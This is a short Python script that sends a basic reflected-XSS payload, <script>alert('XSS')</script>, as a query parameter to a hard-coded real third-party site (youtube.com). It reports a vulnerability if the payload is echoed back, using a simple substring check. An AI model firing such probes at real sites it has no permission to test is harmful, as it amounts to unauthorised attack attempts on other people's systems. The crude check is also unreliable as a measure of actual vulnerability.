import requests

# Target URL vulnerable to XSS (replace with your target URL)
target_url = "https://youtube.com/"

# Payload for testing XSS (replace with your XSS payload)
xss_payload = "<script>alert('XSS')</script>"

# Function to send GET request with payload
def send_get_request(url, payload):
    try:
        response = requests.get(url, params={"q": payload})
        return response.text
    except requests.exceptions.RequestException as e:
        print(f"An error occurred: {e}")
        return None

# Send GET request with XSS payload
response_content = send_get_request(target_url, xss_payload)

# Check if the payload is reflected in the response
if response_content and xss_payload in response_content:
    print(f"XSS vulnerability detected at: {target_url}")
else:
    print(f"No XSS vulnerability detected at: {target_url}")
